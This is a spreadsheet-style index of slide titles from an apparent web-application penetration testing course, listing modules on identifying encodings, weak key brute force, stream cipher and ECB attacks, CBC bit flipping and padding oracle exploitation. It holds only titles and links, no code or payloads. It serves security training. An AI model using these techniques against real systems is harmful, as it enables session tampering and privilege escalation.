S642-3.1.2.371,SEC642,3. Identifying Cryptography,,,,,,,,3.1.2: Identifying Crypto,371,,,true,,,sec642/43305/index.htm#3,,,,
S642-3.1.1.351,SEC642,11. Poisoned Message Attack,,,,,,,,3.1.1: Web App. Crypto Attacks,351,,,true,,,sec642/43300/index.htm#11,,,,
S642-3.1.1.352,SEC642,12. Poisoned Message,,,,,,,,3.1.1: Web App. Crypto Attacks,352,,,true,,,sec642/43300/index.htm#12,,,,
S642-3.1.1.353,SEC642,13. if H(M) == H(M') then H(M+M2) == H(M'+M2),,,,,,,,3.1.1: Web App. Crypto Attacks,353,,,true,,,sec642/43300/index.htm#13,,,,
S642-3.1.2.372,SEC642,4. Data Encoding,,,,,,,,3.1.2: Identifying Crypto,372,,,true,,,sec642/43305/index.htm#4,,,,
S642-3.1.2.373,SEC642,5. Burp Decoder,,,,,,,,3.1.2: Identifying Crypto,373,,,true,,,sec642/43305/index.htm#5,,,,
S642-3.1.2.374,SEC642,6. Is it Encrypted/Hashed?,,,,,,,,3.1.2: Identifying Crypto,374,,,true,,,sec642/43305/index.htm#6,,,,
S642-3.1.2.375,SEC642,7. Ent Analysis,,,,,,,,3.1.2: Identifying Crypto,375,,,true,,,sec642/43305/index.htm#7,,,,
S642-3.1.2.376,SEC642,8. Burp Sequencer,,,,,,,,3.1.2: Identifying Crypto,376,,,true,,,sec642/43305/index.htm#8,,,,
S642-3.1.2.380,SEC642,12. Length Evaluation,,,,,,,,3.1.2: Identifying Crypto,380,,,true,,,sec642/43305/index.htm#12,,,,
S642-3.1.2.381,SEC642,13. HashCalc,,,,,,,,3.1.2: Identifying Crypto,381,,,true,,,sec642/43305/index.htm#13,,,,
S642-3.1.2.382,SEC642,14. Custom Hashes,,,,,,,,3.1.2: Identifying Crypto,382,,,true,,,sec642/43305/index.htm#14,,,,
S642-3.1.2.383,SEC642,15. Passlib,,,,,,,,3.1.2: Identifying Crypto,383,,,true,,,sec642/43305/index.htm#15,,,,
S642-3.1.2.384,SEC642,16. Module Summary,,,,,,,,3.1.2: Identifying Crypto,384,,,true,,,sec642/43305/index.htm#16,,,,
S642-3.1.2.385,SEC642,17. Course Roadmap,,,,,,,,3.1.2: Identifying Crypto,385,,,,,,sec642/43305/index.htm#17,,,,
S642-3.1.2.386,SEC642,18. Exercise: Data Encoding Analysis,,,,,,,,3.1.2: Identifying Crypto,386,,,,,,sec642/43305/index.htm#18,,,,
S642-3.1.2.387,SEC642,19. Data Encoding Analysis - STOP,,,,,,,,3.1.2: Identifying Crypto,387,,,true,,,sec642/43305/index.htm#19,,,,
S642-3.1.2.388,SEC642,20. Initial Resource Page,,,,,,,,3.1.2: Identifying Crypto,388,,,true,,,sec642/43305/index.htm#20,,,,
S642-3.1.2.389,SEC642,21. Cookie Content to Decoder,,,,,,,,3.1.2: Identifying Crypto,389,,,true,,,sec642/43305/index.htm#21,,,,
S642-3.1.2.390,SEC642,22. Burp Decoder,,,,,,,,3.1.2: Identifying Crypto,390,,,true,,,sec642/43305/index.htm#22,,,,
S642-3.1.2.391,SEC642,23. These Links Look Interesting,,,,,,,,3.1.2: Identifying Crypto,391,,,true,,,sec642/43305/index.htm#23,,,,
S642-3.1.2.392,SEC642,24. Base64 Decoded,,,,,,,,3.1.2: Identifying Crypto,392,,,true,,,sec642/43305/index.htm#24,,,,
S642-3.1.2.393,SEC642,25. Administrator User,,,,,,,,3.1.2: Identifying Crypto,393,,,true,,,sec642/43305/index.htm#25,,,,
S642-3.1.2.394,SEC642,26. Review: Data Encoding Analysis,,,,,,,,3.1.2: Identifying Crypto,394,,,,,,sec642/43305/index.htm#26,,,,
S642-3.1.2.395,SEC642,27. Course Roadmap,,,,,,,,3.1.2: Identifying Crypto,395,,,,,,sec642/43305/index.htm#27,,,,
S642-3.1.2.396,SEC642,28. Exercise: Entropy Analysis,,,,,,,,3.1.2: Identifying Crypto,396,,,,,,sec642/43305/index.htm#28,,,,
S642-3.1.2.397,SEC642,29. Entropy Analysis - STOP,,,,,,,,3.1.2: Identifying Crypto,397,,,true,,,sec642/43305/index.htm#29,,,,
S642-3.1.2.377,SEC642,9. Burp Sequencer Token Variation,,,,,,,,3.1.2: Identifying Crypto,377,,,true,,,sec642/43305/index.htm#9,,,,
S642-3.1.2.378,SEC642,10. Length Analysis,,,,,,,,3.1.2: Identifying Crypto,378,,,true,,,sec642/43305/index.htm#10,,,,
S642-3.1.2.379,SEC642,11. Input Data Manipulation,,,,,,,,3.1.2: Identifying Crypto,379,,,true,,,sec642/43305/index.htm#11,,,,
S642-3.1.2.398,SEC642,30. Site Browsing,,,,,,,,3.1.2: Identifying Crypto,398,,,true,,,sec642/43305/index.htm#30,,,,
S642-3.1.2.399,SEC642,31. Burp Sequencer Threads,,,,,,,,3.1.2: Identifying Crypto,399,,,true,,,sec642/43305/index.htm#31,,,,
S642-3.1.2.400,SEC642,32. Sequencer Options,,,,,,,,3.1.2: Identifying Crypto,400,,,true,,,sec642/43305/index.htm#32,,,,
S642-3.1.2.401,SEC642,33. X-Crazy-Cars-Tracker,,,,,,,,3.1.2: Identifying Crypto,401,,,true,,,sec642/43305/index.htm#33,,,,
S642-3.1.2.402,SEC642,34. X-Crazy-Cars-Tracker Analysis,,,,,,,,3.1.2: Identifying Crypto,402,,,true,,,sec642/43305/index.htm#34,,,,
S642-3.1.2.406,SEC642,38. state Cookie - No Encoding,,,,,,,,3.1.2: Identifying Crypto,406,,,true,,,sec642/43305/index.htm#38,,,,
S642-3.1.2.407,SEC642,39. state Cookie Variation,,,,,,,,3.1.2: Identifying Crypto,407,,,true,,,sec642/43305/index.htm#39,,,,
S642-3.1.2.408,SEC642,40. Review: Entropy Analysis,,,,,,,,3.1.2: Identifying Crypto,408,,,,,,sec642/43305/index.htm#40,,,,
S642-3.1.3.409,SEC642,3.1.3: Attacking Encryption Keys,,,,,,,,3.1.3: Attacking Encryption Keys,409,,,true,,,sec642/43310/index.htm,,,,
S642-3.1.3.410,SEC642,2. Weak Cipher Selection,,,,,,,,3.1.3: Attacking Encryption Keys,410,,,true,,,sec642/43310/index.htm#2,,,,
S642-3.1.3.411,SEC642,3. GPU Accelerated Cracking,,,,,,,,3.1.3: Attacking Encryption Keys,411,,,true,,,sec642/43310/index.htm#3,,,,
S642-3.1.2.404,SEC642,36. img,,,,,,,,3.1.2: Identifying Crypto,404,,,true,,,sec642/43305/index.htm#36,,,,
S642-3.1.2.403,SEC642,35. PHPSESSID Cookie,,,,,,,,3.1.2: Identifying Crypto,403,,,true,,,sec642/43305/index.htm#35,,,,
S642-3.1.3.414,SEC642,6. TYPO3 Key Generation,,,,,,,,3.1.3: Attacking Encryption Keys,414,,,true,,,sec642/43310/index.htm#6,,,,
S642-3.1.3.415,SEC642,7. Requirements for Attack Success,,,,,,,,3.1.3: Attacking Encryption Keys,415,,,true,,,sec642/43310/index.htm#7,,,,
S642-3.1.3.416,SEC642,8. TYPO3 URL Protection,,,,,,,,3.1.3: Attacking Encryption Keys,416,,,true,,,sec642/43310/index.htm#8,,,,
S642-3.1.3.417,SEC642,9. TYPO3 Key Brute Force,,,,,,,,3.1.3: Attacking Encryption Keys,417,,,true,,,sec642/43310/index.htm#9,,,,
S642-3.1.3.418,SEC642,10. TYPO3 XSS With Key Recovery,,,,,,,,3.1.3: Attacking Encryption Keys,418,,,true,,,sec642/43310/index.htm#10,,,,
S642-3.1.3.413,SEC642,5. TYPO3,,,,,,,,3.1.3: Attacking Encryption Keys,413,,,true,,,sec642/43310/index.htm#5,,,,
S642-3.1.3.420,SEC642,12. Module Summary,,,,,,,,3.1.3: Attacking Encryption Keys,420,,,true,,,sec642/43310/index.htm#12,,,,
S642-3.1.3.421,SEC642,13. Course Roadmap,,,,,,,,3.1.3: Attacking Encryption Keys,421,,,,,,sec642/43310/index.htm#13,,,,
S642-3.1.3.422,SEC642,14. Exercise: Weak Key Attack,,,,,,,,3.1.3: Attacking Encryption Keys,422,,,,,,sec642/43310/index.htm#14,,,,
S642-3.1.3.423,SEC642,15. Reconnaissance,,,,,,,,3.1.3: Attacking Encryption Keys,423,,,true,,,sec642/43310/index.htm#15,,,,
S642-3.1.3.419,SEC642,11. Evaluating Encryption Keys,,,,,,,,3.1.3: Attacking Encryption Keys,419,,,true,,,sec642/43310/index.htm#11,,,,
S642-3.1.3.412,SEC642,4. Weak Key Selection,,,,,,,,3.1.3: Attacking Encryption Keys,412,,,true,,,sec642/43310/index.htm#4,,,,
S642-3.1.3.424,SEC642,16. Weak Key Attack - STOP,,,,,,,,3.1.3: Attacking Encryption Keys,424,,,true,,,sec642/43310/index.htm#16,,,,
S642-3.1.3.425,SEC642,17. Exercise: Weak Key Attack,,,,,,,,3.1.3: Attacking Encryption Keys,425,,,,,,sec642/43310/index.htm#17,,,,
S642-3.1.3.426,SEC642,18. FailPics! URL,,,,,,,,3.1.3: Attacking Encryption Keys,426,,,true,,,sec642/43310/index.htm#18,,,,
S642-3.1.3.428,SEC642,20. Valid URL,,,,,,,,3.1.3: Attacking Encryption Keys,428,,,true,,,sec642/43310/index.htm#20,,,,
S642-3.1.3.427,SEC642,19. Reconnaissance Analysis,,,,,,,,3.1.3: Attacking Encryption Keys,427,,,true,,,sec642/43310/index.htm#19,,,,
S642-3.1.3.429,SEC642,21. Search Space,,,,,,,,3.1.3: Attacking Encryption Keys,429,,,true,,,sec642/43310/index.htm#21,,,,
S642-3.1.3.430,SEC642,22. Hashing the Key Guess,,,,,,,,3.1.3: Attacking Encryption Keys,430,,,true,,,sec642/43310/index.htm#22,,,,
S642-3.1.3.431,SEC642,23. Finished Script,,,,,,,,3.1.3: Attacking Encryption Keys,431,,,true,,,sec642/43310/index.htm#23,,,,
S642-3.1.3.432,SEC642,24. Custom SQL Statement,,,,,,,,3.1.3: Attacking Encryption Keys,432,,,true,,,sec642/43310/index.htm#24,,,,
S642-3.1.3.433,SEC642,25. Review: Weak Key Access,,,,,,,,3.1.3: Attacking Encryption Keys,433,,,,,,sec642/43310/index.htm#25,,,,
S642-3.1.4.434,SEC642,3.1.4: Attacking Stream Ciphers,,,,,,,,3.1.4: Attacking Stream Ciphers,434,,,true,,,sec642/43315/index.htm,,,,
S642-3.1.4.435,SEC642,2. Stream Cipher Attack,,,,,,,,3.1.4: Attacking Stream Ciphers,435,,,true,,,sec642/43315/index.htm#2,,,,
S642-3.1.4.436,SEC642,3. Identifying a Stream Cipher,,,,,,,,3.1.4: Attacking Stream Ciphers,436,,,true,,,sec642/43315/index.htm#3,,,,
S642-3.1.4.437,SEC642,4. Stream Cipher Operation,,,,,,,,3.1.4: Attacking Stream Ciphers,437,,,true,,,sec642/43315/index.htm#4,,,,
S642-3.1.4.438,SEC642,5. Stream Cipher Encrypt/Decrypt,,,,,,,,3.1.4: Attacking Stream Ciphers,438,,,true,,,sec642/43315/index.htm#5,,,,
S642-3.1.4.441,SEC642,8. URL Tampering,,,,,,,,3.1.4: Attacking Stream Ciphers,441,,,true,,,sec642/43315/index.htm#8,,,,
S642-3.1.4.439,SEC642,6. Keystream Use,,,,,,,,3.1.4: Attacking Stream Ciphers,439,,,true,,,sec642/43315/index.htm#6,,,,
S642-3.1.4.440,SEC642,"7. Encrypted, Hidden Fields",,,,,,,,3.1.4: Attacking Stream Ciphers,440,,,true,,,sec642/43315/index.htm#7,,,,
S642-3.1.4.442,SEC642,9. Cipher Analysis,,,,,,,,3.1.4: Attacking Stream Ciphers,442,,,true,,,sec642/43315/index.htm#9,,,,
S642-3.1.4.443,SEC642,10. Using Recovered Keystream,,,,,,,,3.1.4: Attacking Stream Ciphers,443,,,true,,,sec642/43315/index.htm#10,,,,
S642-3.1.4.446,SEC642,13. Precautions,,,,,,,,3.1.4: Attacking Stream Ciphers,446,,,true,,,sec642/43315/index.htm#13,,,,
S642-3.1.4.444,SEC642,11. Larger Keystream,,,,,,,,3.1.4: Attacking Stream Ciphers,444,,,true,,,sec642/43315/index.htm#11,,,,
S642-3.1.4.445,SEC642,12. Scripts Make this Easier,,,,,,,,3.1.4: Attacking Stream Ciphers,445,,,true,,,sec642/43315/index.htm#12,,,,
S642-3.1.4.447,SEC642,14. Module Summary,,,,,,,,3.1.4: Attacking Stream Ciphers,447,,,true,,,sec642/43315/index.htm#14,,,,
S642-3.1.4.448,SEC642,15. Course Roadmap,,,,,,,,3.1.4: Attacking Stream Ciphers,448,,,,,,sec642/43315/index.htm#15,,,,
S642-3.1.4.451,SEC642,18. FileBoss,,,,,,,,3.1.4: Attacking Stream Ciphers,451,,,true,,,sec642/43315/index.htm#18,,,,
S642-3.1.4.452,SEC642,19. How is it Encrypting Data?,,,,,,,,3.1.4: Attacking Stream Ciphers,452,,,true,,,sec642/43315/index.htm#19,,,,
S642-3.1.4.453,SEC642,20. Ciphertext/Plaintext Pair,,,,,,,,3.1.4: Attacking Stream Ciphers,453,,,true,,,sec642/43315/index.htm#20,,,,
S642-3.1.4.454,SEC642,21. Encrypted Content,,,,,,,,3.1.4: Attacking Stream Ciphers,454,,,true,,,sec642/43315/index.htm#21,,,,
S642-3.1.4.455,SEC642,22. Message Decoding,,,,,,,,3.1.4: Attacking Stream Ciphers,455,,,true,,,sec642/43315/index.htm#22,,,,
S642-3.1.4.456,SEC642,23. xor2files.py,,,,,,,,3.1.4: Attacking Stream Ciphers,456,,,true,,,sec642/43315/index.htm#23,,,,
S642-3.1.4.457,SEC642,24. Script Solutions,,,,,,,,3.1.4: Attacking Stream Ciphers,457,,,true,,,sec642/43315/index.htm#24,,,,
S642-3.1.4.458,SEC642,25. Review: Stream Cipher IV Collision Attack,,,,,,,,3.1.4: Attacking Stream Ciphers,458,,,,,,sec642/43315/index.htm#25,,,,
S642-3.1.5.459,SEC642,3.1.5: Attacking ECB Mode Ciphers,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,459,,,true,,,sec642/43320/index.htm,,,,
S642-3.1.5.460,SEC642,2. ECB Encryption,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,460,,,true,,,sec642/43320/index.htm#2,,,,
S642-3.1.5.461,SEC642,3. ECB Block Shuffling,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,461,,,true,,,sec642/43320/index.htm#3,,,,
S642-3.1.5.462,SEC642,4. Manual Shuffling,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,462,,,true,,,sec642/43320/index.htm#4,,,,
S642-3.1.5.463,SEC642,5. Intruder ECB Block Shuffler (1),,,,,,,,3.1.5: Attacking ECB Mode Ciphers,463,,,true,,,sec642/43320/index.htm#5,,,,
S642-3.1.5.464,SEC642,6. Intruder ECB Block Shuffler (2),,,,,,,,3.1.5: Attacking ECB Mode Ciphers,464,,,true,,,sec642/43320/index.htm#6,,,,
S642-3.1.5.465,SEC642,7. ECB Shuffling Data Sources,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,465,,,true,,,sec642/43320/index.htm#7,,,,
S642-3.1.5.466,SEC642,8. Adding ECB Blocks for Intruder,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,466,,,true,,,sec642/43320/index.htm#8,,,,
S642-3.1.5.467,SEC642,9. ECB Decryption Opportunity,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,467,,,true,,,sec642/43320/index.htm#9,,,,
S642-3.1.5.468,SEC642,10. Module Summary,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,468,,,true,,,sec642/43320/index.htm#10,,,,
S642-3.1.4.449,SEC642,16. Exercise: Stream Cipher IV Collision Attack,,,,,,,,3.1.4: Attacking Stream Ciphers,449,,,,,,sec642/43315/index.htm#16,,,,
S642-3.1.4.450,SEC642,17. Stream Cipher IV Collision Attack - STOP,,,,,,,,3.1.4: Attacking Stream Ciphers,450,,,true,,,sec642/43315/index.htm#17,,,,
S642-3.1.5.469,SEC642,11. Course Roadmap,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,469,,,,,,sec642/43320/index.htm#11,,,,
S642-3.1.5.470,SEC642,12. Exercise: ECB Shuffling,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,470,,,,,,sec642/43320/index.htm#12,,,,
S642-3.1.5.471,SEC642,13. ECB Shuffling Attack - STOP,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,471,,,true,,,sec642/43320/index.htm#13,,,,
S642-3.1.5.472,SEC642,14. Add a Gremlin,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,472,,,true,,,sec642/43320/index.htm#14,,,,
S642-3.1.5.473,SEC642,"15. Burp View of ""state"" Cookie",,,,,,,,3.1.5: Attacking ECB Mode Ciphers,473,,,true,,,sec642/43320/index.htm#15,,,,
S642-3.1.5.475,SEC642,17. Burp Intruder (2),,,,,,,,3.1.5: Attacking ECB Mode Ciphers,475,,,true,,,sec642/43320/index.htm#17,,,,
S642-3.1.5.476,SEC642,18. Burp Intruder (3),,,,,,,,3.1.5: Attacking ECB Mode Ciphers,476,,,true,,,sec642/43320/index.htm#18,,,,
S642-3.1.5.477,SEC642,19. Initial Intruder ECB Shuffler,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,477,,,true,,,sec642/43320/index.htm#19,,,,
S642-3.1.5.478,SEC642,20. Gather Other Encrypted Blocks,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,478,,,true,,,sec642/43320/index.htm#20,,,,
S642-3.1.5.479,SEC642,21. Back to Intruder,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,479,,,true,,,sec642/43320/index.htm#21,,,,
S642-3.1.5.480,SEC642,22. Product Price Validation,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,480,,,true,,,sec642/43320/index.htm#22,,,,
S642-3.1.5.481,SEC642,23. Review: ECB Shuffling,,,,,,,,3.1.5: Attacking ECB Mode Ciphers,481,,,,,,sec642/43320/index.htm#23,,,,
S642-3.1.6.482,SEC642,3.1.6: Exploiting CBC Bit Flipping,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,482,,,true,,,sec642/43325/index.htm,,,,
S642-3.1.6.483,SEC642,2. CBC Encryption,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,483,,,true,,,sec642/43325/index.htm#2,,,,
S642-3.1.6.484,SEC642,3. CBC Bit Flipping,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,484,,,true,,,sec642/43325/index.htm#3,,,,
S642-3.1.5.474,SEC642,16. Burp Intruder (1),,,,,,,,3.1.5: Attacking ECB Mode Ciphers,474,,,true,,,sec642/43320/index.htm#16,,,,
S642-3.1.6.485,SEC642,4. CBC Bit Flip Privilege Escalation,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,485,,,true,,,sec642/43325/index.htm#4,,,,
S642-3.1.6.486,SEC642,5. Cipher Analysis,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,486,,,true,,,sec642/43325/index.htm#5,,,,
S642-3.1.6.487,SEC642,6. IV Manipulation,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,487,,,true,,,sec642/43325/index.htm#6,,,,
S642-3.1.6.488,SEC642,7. Manual IV Analysis,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,488,,,true,,,sec642/43325/index.htm#7,,,,
S642-3.1.6.489,SEC642,8. Data Manipulation,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,489,,,true,,,sec642/43325/index.htm#8,,,,
S642-3.1.6.490,SEC642,9. CBC Bit Flipping with Burp,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,490,,,true,,,sec642/43325/index.htm#9,,,,
S642-3.1.6.491,SEC642,10. CBC Manipulation,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,491,,,true,,,sec642/43325/index.htm#10,,,,
S642-3.1.6.492,SEC642,11. Module Summary,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,492,,,true,,,sec642/43325/index.htm#11,,,,
S642-3.1.6.493,SEC642,12. Course Roadmap,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,493,,,,,,sec642/43325/index.htm#12,,,,
S642-3.1.6.494,SEC642,13. Exercise: CBC Bit Flipping,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,494,,,,,,sec642/43325/index.htm#13,,,,
S642-3.1.6.495,SEC642,14. CBC Bit Flipping Attack - STOP,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,495,,,true,,,sec642/43325/index.htm#14,,,,
S642-3.1.6.496,SEC642,15. Post-Login UID Reporting,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,496,,,true,,,sec642/43325/index.htm#15,,,,
S642-3.1.6.497,SEC642,16. Privilege Escalation Attack,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,497,,,true,,,sec642/43325/index.htm#16,,,,
S642-3.1.6.498,SEC642,17. Post-Login Cookie Analysis,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,498,,,true,,,sec642/43325/index.htm#17,,,,
S642-3.1.6.499,SEC642,18. IV 10th Byte,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,499,,,true,,,sec642/43325/index.htm#18,,,,
S642-3.1.6.502,SEC642,21. Alternative: Burp Intruder,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,502,,,true,,,sec642/43325/index.htm#21,,,,
S642-3.1.6.503,SEC642,22. Review: CBC Bit Flipping,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,503,,,,,,sec642/43325/index.htm#22,,,,
S642-3.1.6.504,SEC642,23. Conclusions,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,504,,,,,,sec642/43325/index.htm#23,,,,
S642-4.1.1.505,SEC642,4.1.1: Attacking CBC Chosen Plaintext,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,505,,,true,,,sec642/43330/index.htm,,,,
S642-4.1.1.506,SEC642,2. Course Roadmap,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,506,,,,,,sec642/43330/index.htm#2,,,,
S642-4.1.1.507,SEC642,3. CBC Chosen Plaintext Attack,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,507,,,true,,,sec642/43330/index.htm#3,,,,
S642-4.1.1.508,SEC642,4. TLS 1.0 CBC IV's,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,508,,,true,,,sec642/43330/index.htm#4,,,,
S642-4.1.1.509,SEC642,5. Influencing CBC Encryption,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,509,,,true,,,sec642/43330/index.htm#5,,,,
S642-4.1.1.510,SEC642,6. Technique Effectiveness,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,510,,,true,,,sec642/43330/index.htm#6,,,,
S642-4.1.1.511,SEC642,7. Chosen Boundary Advancement,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,511,,,true,,,sec642/43330/index.htm#7,,,,
S642-4.1.1.512,SEC642,8. Web Attack Exploitability,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,512,,,true,,,sec642/43330/index.htm#8,,,,
S642-4.1.1.513,SEC642,9. SSL Scan,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,513,,,true,,,sec642/43330/index.htm#9,,,,
S642-4.1.1.514,SEC642,10. Module Summary,,,,,,,,4.1.1: Attacking CBC Chosen Plaintext,514,,,true,,,sec642/43330/index.htm#10,,,,
S642-4.1.2.515,SEC642,4.1.2: Exploiting Padding Oracles,,,,,,,,4.1.2: Exploiting Padding Oracles,515,,,true,,,sec642/43335/index.htm,,,,
S642-4.1.2.516,SEC642,2. Padding Oracle Attacks,,,,,,,,4.1.2: Exploiting Padding Oracles,516,,,true,,,sec642/43335/index.htm#2,,,,
S642-4.1.2.517,SEC642,3. PKCS#7 Padding,,,,,,,,4.1.2: Exploiting Padding Oracles,517,,,true,,,sec642/43335/index.htm#3,,,,
S642-4.1.2.518,SEC642,4. PKCS#7 Examples,,,,,,,,4.1.2: Exploiting Padding Oracles,518,,,true,,,sec642/43335/index.htm#4,,,,
S642-3.1.6.500,SEC642,19. IV 11th Byte,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,500,,,true,,,sec642/43325/index.htm#19,,,,
S642-3.1.6.501,SEC642,20. IV 13th Byte,,,,,,,,3.1.6: Exploiting CBC Bit Flipping,501,,,true,,,sec642/43325/index.htm#20,,,,
S642-4.1.2.519,SEC642,5. Oracle Padding Attack,,,,,,,,4.1.2: Exploiting Padding Oracles,519,,,true,,,sec642/43335/index.htm#5,,,,
S642-4.1.2.520,SEC642,6. Oracle Padding Attack Walkthrough (1),,,,,,,,4.1.2: Exploiting Padding Oracles,520,,,true,,,sec642/43335/index.htm#6,,,,
S642-4.1.2.521,SEC642,7. Oracle Padding Attack Walkthrough (2),,,,,,,,4.1.2: Exploiting Padding Oracles,521,,,true,,,sec642/43335/index.htm#7,,,,
S642-4.1.2.522,SEC642,8. Oracle Padding Attack Walkthrough (3),,,,,,,,4.1.2: Exploiting Padding Oracles,522,,,true,,,sec642/43335/index.htm#8,,,,
S642-4.1.2.525,SEC642,11. Oracle Attack Results,,,,,,,,4.1.2: Exploiting Padding Oracles,525,,,true,,,sec642/43335/index.htm#11,,,,
S642-4.1.2.526,SEC642,12. padBuster,,,,,,,,4.1.2: Exploiting Padding Oracles,526,,,true,,,sec642/43335/index.htm#12,,,,
S642-4.1.2.527,SEC642,13. Padding Oracle vs. CAPTCHA,,,,,,,,4.1.2: Exploiting Padding Oracles,527,,,true,,,sec642/43335/index.htm#13,,,,
S642-4.1.2.528,SEC642,14. padBuster Attack,,,,,,,,4.1.2: Exploiting Padding Oracles,528,,,true,,,sec642/43335/index.htm#14,,,,
S642-4.1.2.529,SEC642,15. padBuster (1),,,,,,,,4.1.2: Exploiting Padding Oracles,529,,,true,,,sec642/43335/index.htm#15,,,,
S642-4.1.2.530,SEC642,16. padBuster (2),,,,,,,,4.1.2: Exploiting Padding Oracles,530,,,true,,,sec642/43335/index.htm#16,,,,
S642-4.1.2.523,SEC642,9. Oracle Padding Attack Walkthrough (4),,,,,,,,4.1.2: Exploiting Padding Oracles,523,,,true,,,sec642/43335/index.htm#9,,,,
S642-4.1.2.532,SEC642,18. CAPTCHA Graffiti,,,,,,,,4.1.2: Exploiting Padding Oracles,532,,,true,,,sec642/43335/index.htm#18,,,,
S642-4.1.2.533,SEC642,19. Identifying Padding Oracle Opportunities,,,,,,,,4.1.2: Exploiting Padding Oracles,533,,,true,,,sec642/43335/index.htm#19,,,,
S642-4.1.2.531,SEC642,17. Encrypting with Padding Oracle,,,,,,,,4.1.2: Exploiting Padding Oracles,531,,,true,,,sec642/43335/index.htm#17,,,,
S642-4.1.2.535,SEC642,21. Course Roadmap,,,,,,,,4.1.2: Exploiting Padding Oracles,535,,,,,,sec642/43335/index.htm#21,,,,
S642-4.1.2.536,SEC642,22. Exercise: Padding Oracle Attack - EvilCAPTCHA,,,,,,,,4.1.2: Exploiting Padding Oracles,536,,,,,,sec642/43335/index.htm#22,,,,
S642-4.1.2.537,SEC642,23. Padding Oracle Attack - STOP,,,,,,,,4.1.2: Exploiting Padding Oracles,537,,,true,,,sec642/43335/index.htm#23,,,,
S642-4.1.2.534,SEC642,20. Module Summary,,,,,,,,4.1.2: Exploiting Padding Oracles,534,,,true,,,sec642/43335/index.htm#20,,,,
S642-4.1.2.539,SEC642,25. padBuster Attack,,,,,,,,4.1.2: Exploiting Padding Oracles,539,,,true,,,sec642/43335/index.htm#25,,,,
S642-4.1.2.538,SEC642,24. Obtain Target URL,,,,,,,,4.1.2: Exploiting Padding Oracles,538,,,true,,,sec642/43335/index.htm#24,,,,
S642-4.1.2.541,SEC642,27. Course Roadmap,,,,,,,,4.1.2: Exploiting Padding Oracles,541,,,,,,sec642/43335/index.htm#27,,,,
S642-4.1.2.542,SEC642,28. Exercise: CAPTCHA Graffiti,,,,,,,,4.1.2: Exploiting Padding Oracles,542,,,,,,sec642/43335/index.htm#28,,,,
S642-4.1.2.524,SEC642,10. Oracle Padding Attack Walkthrough (5),,,,,,,,4.1.2: Exploiting Padding Oracles,524,,,true,,,sec642/43335/index.htm#10,,,,
S642-4.1.2.540,SEC642,26. Complete the EvilCAPTCHA,,,,,,,,4.1.2: Exploiting Padding Oracles,540,,,true,,,sec642/43335/index.htm#26,,,,
S642-4.1.2.543,SEC642,29. CAPTCHA Graffiti - STOP,,,,,,,,4.1.2: Exploiting Padding Oracles,543,,,true,,,sec642/43335/index.htm#29,,,,
S642-4.1.2.546,SEC642,32. Review: Padding Oracle Attacks,,,,,,,,4.1.2: Exploiting Padding Oracles,546,,,,,,sec642/43335/index.htm#32,,,,
S642-4.1.2.544,SEC642,30. Site Navigation,,,,,,,,4.1.2: Exploiting Padding Oracles,544,,,true,,,sec642/43335/index.htm#30,,,,
S642-4.1.2.545,SEC642,31. padBuster Graffiti,,,,,,,,4.1.2: Exploiting Padding Oracles,545,,,true,,,sec642/43335/index.htm#31,,,,
S642-4.1.3.547,SEC642,4.1.3: Practical Web Crypto Exploitation,,,,,,,,4.1.3: Practical Web Crypto Exploitation,547,,,true,,,sec642/43340/index.htm,,,,
S642-4.1.3.550,SEC642,4. Burp Comparer (Comparerer),,,,,,,,4.1.3: Practical Web Crypto Exploitation,550,,,true,,,sec642/43340/index.htm#4,,,,
S642-4.1.3.548,SEC642,2. Crypto Attack Recommendations (1),,,,,,,,4.1.3: Practical Web Crypto Exploitation,548,,,true,,,sec642/43340/index.htm#2,,,,
S642-4.1.3.552,SEC642,6. Tool Limitations,,,,,,,,4.1.3: Practical Web Crypto Exploitation,552,,,true,,,sec642/43340/index.htm#6,,,,
S642-4.1.3.553,SEC642,7. Don't Just Stop at Cryptography,,,,,,,,4.1.3: Practical Web Crypto Exploitation,553,,,true,,,sec642/43340/index.htm#7,,,,
S642-4.1.3.554,SEC642,8. Practical Cryptography Attacks,,,,,,,,4.1.3: Practical Web Crypto Exploitation,554,,,true,,,sec642/43340/index.htm#8,,,,
